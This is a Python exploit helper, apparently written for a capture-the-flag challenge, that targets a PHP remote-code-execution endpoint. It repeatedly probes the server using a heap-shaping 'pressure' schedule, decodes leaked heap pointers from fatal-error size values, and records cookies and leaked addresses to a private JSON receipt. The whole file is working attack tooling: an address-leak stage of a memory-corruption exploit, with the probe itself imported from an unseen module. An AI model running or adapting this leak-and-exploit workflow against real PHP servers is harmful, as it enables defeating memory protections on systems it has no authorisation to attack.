#!/usr/bin/env python3
"""Bounded hot-band heap refresh for the authorized Cloudflare PHP CTF.

This keeps the proven 900-array ``steer_ht`` geometry and strict decoder.  It
changes only the pressure schedule: all observed strict live receipts landed
at 650k or 550k, so the helper alternates those bands instead of spending
requests on the four zero-hit bands in the historical round-robin.
"""

from __future__ import annotations

import argparse
import importlib
import json
import os
from pathlib import Path
import time
from typing import Callable


HOST = "php-rce.cloudflare.app"
PATH = "/php/index.php"
ARRAYS = 900
PRESSURES = (650_000, 550_000)
FIXED_PRESSURES = (440_000, 550_000, 650_000)
MAX_ATTEMPTS = 12
PACE_SECONDS = 1.0
CANONICAL_MIN = 0x700000000000
CANONICAL_MAX = 0x800000000000


def decode_tried(tried: object) -> dict | None:
    """Apply the existing strict heap decoder without widening acceptance."""
    if not isinstance(tried, int):
        return None
    if (tried - 32) % 3 == 0:
        pointer = (tried - 32) // 3
        if CANONICAL_MIN <= pointer < CANONICAL_MAX:
            return {
                "pointer": hex(pointer),
                "heap": hex(pointer & ~0x1FFFFF),
                "oracle": "triple-length-fatal",
            }
    if CANONICAL_MIN <= tried < CANONICAL_MAX:
        return {
            "pointer": hex(tried),
            "heap": hex(tried & ~0x1FFFFF),
            "oracle": "direct-canonical-size-fatal",
        }
    return None


def pressure_for(sequence_index: int) -> int:
    return PRESSURES[sequence_index % len(PRESSURES)]


def write_private(path: Path, document: dict) -> None:
    flags = os.O_WRONLY | os.O_CREAT | os.O_EXCL
    if hasattr(os, "O_NOFOLLOW"):
        flags |= os.O_NOFOLLOW
    descriptor = os.open(path, flags, 0o600)
    try:
        with os.fdopen(descriptor, "w", encoding="utf-8") as stream:
            descriptor = -1
            json.dump(document, stream, indent=2, sort_keys=True)
            stream.write("\n")
            stream.flush()
            os.fsync(stream.fileno())
    finally:
        if descriptor >= 0:
            os.close(descriptor)


def acquire(
    *,
    attempts: int,
    start_index: int,
    fixed_pressure: int | None = None,
    probe: Callable[..., dict],
    sleep: Callable[[float], None] = time.sleep,
) -> dict:
    receipt = {
        "schema": "cfctf-r8/strict-heap-hotband/v1",
        "target": f"https://{HOST}{PATH}",
        "geometry": {
            "arrays": ARRAYS,
            "pressures": [fixed_pressure] if fixed_pressure is not None else list(PRESSURES),
            "pace_seconds": PACE_SECONDS,
            "change_boundary": "pressure schedule only",
        },
        "attempts": [],
        "selected": None,
    }
    for run_index in range(attempts):
        sequence_index = start_index + run_index
        pressure = fixed_pressure if fixed_pressure is not None else pressure_for(sequence_index)
        result = probe(HOST, 443, True, PATH, HOST, ARRAYS, pressure)
        record = {
            "index": sequence_index + 1,
            "run_index": run_index + 1,
            "pressure": pressure,
            **result,
        }
        decoded = decode_tried(result.get("tried"))
        if decoded is not None:
            record.update(decoded)
            receipt["selected"] = dict(record)
        receipt["attempts"].append(record)
        print(
            f"attempt {sequence_index + 1} "
            f"({run_index + 1}/{attempts} this run) pressure={pressure} "
            f"status={result.get('b_status')} cookie={result.get('cookie')} "
            f"tried={result.get('tried')} heap={record.get('heap')}",
            flush=True,
        )
        if receipt["selected"] is not None:
            break
        if run_index + 1 < attempts:
            sleep(PACE_SECONDS)
    receipt["verdict"] = "STRICT_HEAP" if receipt["selected"] else "LEAK_MISS"
    return receipt


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--attempts", type=int, default=MAX_ATTEMPTS,
        choices=range(1, MAX_ATTEMPTS + 1),
    )
    parser.add_argument(
        "--start-index", type=int, default=0,
        choices=range(0, MAX_ATTEMPTS),
    )
    parser.add_argument(
        "--fixed-pressure",
        type=int,
        choices=FIXED_PRESSURES,
        help="use one evidenced pressure for every attempt",
    )
    parser.add_argument("--out", required=True, type=Path)
    parser.add_argument("--authorized-live", action="store_true")
    args = parser.parse_args(argv)
    if not args.authorized_live:
        parser.error("the exact public CTF requires --authorized-live")
    if os.path.lexists(args.out):
        parser.error("--out must be fresh")

    probe = importlib.import_module("steer_ht").probe
    receipt = acquire(
        attempts=args.attempts,
        start_index=args.start_index,
        fixed_pressure=args.fixed_pressure,
        probe=probe,
    )
    write_private(args.out, receipt)
    print(json.dumps({
        "verdict": receipt["verdict"],
        "selected": receipt["selected"],
        "output": str(args.out),
    }, indent=2, sort_keys=True))
    return 0 if receipt["selected"] else 2


if __name__ == "__main__":
    raise SystemExit(main())
